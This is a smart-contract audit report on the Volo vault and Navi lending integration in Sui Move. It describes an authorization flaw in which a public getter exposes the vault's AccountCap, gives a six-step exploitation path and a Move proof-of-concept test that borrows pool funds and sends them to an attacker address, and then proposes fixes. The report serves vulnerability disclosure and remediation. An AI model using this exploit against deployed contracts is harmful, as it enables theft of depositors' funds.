# Audit Report

## Title
Unauthorized Borrowing via Public AccountCap Reference Exposure

## Summary
The vault's `get_defi_asset()` function publicly exposes AccountCap references without authorization checks, allowing any attacker to borrow funds from the Navi lending protocol using the vault's AccountCap. The borrowed funds are returned directly to the attacker while debt accumulates on the vault's lending account, resulting in direct fund theft.

## Finding Description

This vulnerability stems from a critical authorization bypass in the interaction between the Volo vault and Navi lending protocol integration. The vault stores a `NaviAccountCap` (alias for `lending_core::account::AccountCap`) as a DeFi asset to manage its lending positions. However, this AccountCap is publicly accessible without any authorization checks, allowing unauthorized borrowing operations.

**Component 1: Public AccountCap Exposure**

The vault's `get_defi_asset` function is declared as `public` and returns an immutable reference to any stored DeFi asset without performing any authorization checks. [1](#0-0) 

Any address can call this function to obtain a reference to the vault's NaviAccountCap, as demonstrated in the adaptor usage. [2](#0-1) 

**Component 2: Public Borrow Function Without Caller Verification**

The Navi protocol's `incentive_v3::borrow_with_account_cap` function is declared as `public` and accepts an `&AccountCap` parameter. [3](#0-2) 

This function extracts the owner address from the AccountCap and uses it to record the debt, but performs no verification that the caller is authorized to use this AccountCap. [4](#0-3) 

**Component 3: Funds Flow to Caller**

The underlying borrow mechanism calls `base_borrow` which records debt against the AccountCap's owner address but returns the borrowed funds as a `Balance<CoinType>` to the caller. [5](#0-4) 

The `pool::withdraw_balance` function extracts funds from the pool and returns them to the caller, using the `user` parameter only for event logging. [6](#0-5) 

**Component 4: AccountCap Owner Assignment**

When an AccountCap is created, its `owner` field is set to the AccountCap object's own address, not the creator's address. [7](#0-6) 

This means the vault's AccountCap represents a lending account where all borrowing debt accumulates, regardless of who initiated the borrow operation.

**Exploitation Path:**

1. Attacker calls `vault.get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type)` to obtain `&AccountCap`
2. Attacker calls `incentive_v3::borrow_with_account_cap<USDC>(clock, oracle, storage, pool, asset_id, amount, incentive_v2, incentive_v3, account_cap)`
3. The function borrows funds from the lending pool based on the vault's collateral
4. Debt is recorded against the vault's AccountCap owner address
5. Borrowed funds are returned as `Balance<USDC>` to the attacker
6. Attacker converts the balance to a coin and transfers it to themselves

All required parameters (Clock, PriceOracle, Storage, Pool, Incentive objects) are shared objects accessible to any caller in Sui Move.

## Impact Explanation

**Critical Severity - Direct Fund Theft:**

- Attackers can borrow funds directly from the Navi lending protocol using the vault's AccountCap, limited only by the vault's collateral and health factor constraints
- The borrowed funds are transferred directly to the attacker as a `Balance` object that they can freely convert and transfer
- The vault's lending account accumulates debt equal to the borrowed amount plus interest
- This debt must be repaid by the vault using depositor funds, creating a direct loss for all vault participants

**Vault Insolvency Risk:**

- If the unauthorized debt exceeds the vault's deposited collateral, the vault's position becomes liquidatable in the Navi protocol
- The vault's loss tolerance mechanisms cannot prevent this attack as the debt is incurred through external protocol calls, not through the vault's operation framework
- Repeated attacks can drain all available liquidity from the lending pool while imposing maximum debt on the vault

**No Viable Defense:**

- The health factor check in the borrow logic only limits the amount based on available collateral, it does not verify caller authorization. [8](#0-7) 
- The vault's operation framework controls are bypassed entirely since the attack uses direct external protocol calls

## Likelihood Explanation

**Very High - Trivial to Execute:**

- Any address can call the required public functions without special capabilities or assets
- The attack requires only 2 function calls with publicly accessible shared objects
- Asset type strings are predictable (e.g., `parse_key<NaviAccountCap>(0)`)
- No timing constraints, race conditions, or complex setup required

**Zero Cost with Direct Profit:**

- The attacker incurs only gas fees (minimal cost)
- Direct profit equals the full borrowed amount
- No risk to the attacker as all debt is assigned to the vault
- The attack is repeatable until lending pool liquidity is exhausted or vault becomes liquidatable

**Normal Preconditions:**

- The vulnerability is exploitable whenever the vault has Navi integration enabled (standard configuration)
- The vault must have deposited collateral in Navi (part of normal yield strategy operations), as shown in operation tests. [9](#0-8) 

## Recommendation

**Immediate Fix - Remove Public Access:**

Change `get_defi_asset` from `public` to `public(package)` or `friend` visibility to restrict access to authorized vault modules only:

```move
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**Alternative - Authorization Check:**

If public read access is required for legitimate use cases, add explicit authorization:

```move
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
    _operator_cap: &OperatorCap,  // Require operator authorization
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**Long-term - Design Pattern Review:**

Review all functions that expose references to capability objects or valuable assets. Implement a consistent pattern where:
1. References to capability objects are never exposed through public functions
2. All operations using such capabilities are gated by proper authorization checks
3. Consider using witness patterns or other Move security patterns to ensure only authorized code paths can access sensitive assets

## Proof of Concept

```move
#[test_only]
module volo_vault::unauthorized_borrow_exploit_test;

use lending_core::account::AccountCap as NaviAccountCap;
use lending_core::incentive_v2::Incentive as IncentiveV2;
use lending_core::incentive_v3::{Self, Incentive as IncentiveV3};
use lending_core::pool::Pool;
use lending_core::storage::Storage;
use oracle::oracle::PriceOracle;
use sui::clock::Clock;
use sui::coin;
use sui::test_scenario;
use volo_vault::vault::Vault;
use volo_vault::vault_utils;
use volo_vault::sui_test_coin::SUI_TEST_COIN;

const ATTACKER: address = @0xBAD;
const VAULT_OWNER: address = @0xa;

#[test]
// Demonstrates unauthorized borrowing by obtaining AccountCap reference from vault
public fun test_unauthorized_borrow_via_public_account_cap() {
    let mut scenario = test_scenario::begin(ATTACKER);
    
    // Assume vault is set up with Navi integration and has deposited collateral
    // (setup code omitted for brevity - similar to operation.test.move)
    
    scenario.next_tx(ATTACKER);
    {
        // Step 1: Attacker obtains AccountCap reference from vault (no authorization required)
        let vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(0);
        let account_cap = vault.get_defi_asset<SUI_TEST_COIN, NaviAccountCap>(navi_asset_type);
        
        // Step 2: Attacker uses the AccountCap to borrow funds
        let clock = scenario.take_shared<Clock>();
        let oracle = scenario.take_shared<PriceOracle>();
        let mut storage = scenario.take_shared<Storage>();
        let mut pool = scenario.take_shared<Pool<SUI_TEST_COIN>>();
        let mut incentive_v2 = scenario.take_shared<IncentiveV2>();
        let mut incentive_v3 = scenario.take_shared<IncentiveV3>();
        
        // Borrow funds - they are returned to the attacker!
        let stolen_balance = incentive_v3::borrow_with_account_cap<SUI_TEST_COIN>(
            &clock,
            &oracle,
            &mut storage,
            &mut pool,
            0, // asset_id
            1000_000_000_000, // borrow 1000 SUI
            &mut incentive_v2,
            &mut incentive_v3,
            account_cap, // Using vault's AccountCap!
        );
        
        // Step 3: Attacker converts balance to coin and keeps it
        let stolen_coin = coin::from_balance(stolen_balance, scenario.ctx());
        
        // Attacker successfully stole funds while debt goes to vault
        assert!(coin::value(&stolen_coin) > 0, 0);
        
        transfer::public_transfer(stolen_coin, ATTACKER);
        
        // Return shared objects
        test_scenario::return_shared(vault);
        test_scenario::return_shared(clock);
        test_scenario::return_shared(oracle);
        test_scenario::return_shared(storage);
        test_scenario::return_shared(pool);
        test_scenario::return_shared(incentive_v2);
        test_scenario::return_shared(incentive_v3);
    };
    
    scenario.end();
}
```

**Notes:**

This vulnerability represents a complete breakdown of the authorization model for DeFi asset access. The `get_defi_asset` function was likely intended for read-only query purposes within trusted vault operations, but its `public` visibility combined with the Navi protocol's design (where AccountCap references are sufficient for borrowing) creates a critical attack vector. The fix requires restricting access to DeFi assets to authorized vault modules only.

### Citations

**File:** volo-vault/sources/volo_vault.move (L1451-1456)
```text
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L20-20)
```text
    let account_cap = vault.get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type);
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L923-933)
```text
    public fun borrow_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap,
    ): Balance<CoinType> {
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L934-944)
```text
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        let fee = get_borrow_fee(incentive_v3, amount);

        let _balance = lending::borrow_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount + fee, account_cap);

        deposit_borrow_fee(incentive_v3, &mut _balance, fee);

        _balance
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L506-516)
```text
    public(friend) fun borrow_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        account_cap: &AccountCap
    ): Balance<CoinType> {
        base_borrow(clock, oracle, storage, pool, asset, amount, account::account_owner(account_cap))
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/pool.move (L125-140)
```text
    public(friend) fun withdraw_balance<CoinType>(pool: &mut Pool<CoinType>, amount: u64, user: address): Balance<CoinType> {
        if (amount == 0) {
            let _zero = balance::zero<CoinType>();
            return _zero
        };

        let _balance = balance::split(&mut pool.balance, amount);
        emit(PoolWithdraw {
            sender: user,
            recipient: user,
            amount: amount,
            pool: type_name::into_string(type_name::get<CoinType>()),
        });

        return _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/account.move (L13-17)
```text
    public(friend) fun create_account_cap(ctx: &mut TxContext): AccountCap {
        let id = object::new(ctx);
        let owner = object::uid_to_address(&id);
        AccountCap { id, owner}
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/logic.move (L150-155)
```text
        let avg_ltv = calculate_avg_ltv(clock, oracle, storage, user);
        let avg_threshold = calculate_avg_threshold(clock, oracle, storage, user);
        assert!(avg_ltv > 0 && avg_threshold > 0, error::ltv_is_not_enough());
        let health_factor_in_borrow = ray_math::ray_div(avg_threshold, avg_ltv);
        let health_factor = user_health_factor(clock, storage, oracle, user);
        assert!(health_factor >= health_factor_in_borrow, error::user_is_unhealthy());
```

**File:** volo-vault/tests/operation/operation.test.move (L3231-3240)
```text
        incentive_v3::deposit_with_account_cap<SUI_TEST_COIN>(
            &clock,
            &mut storage,
            &mut sui_pool,
            0,
            split_to_deposit_balance.into_coin(s.ctx()),
            &mut incentive_v2,
            &mut incentive_v3,
            navi_account_cap,
        );
```
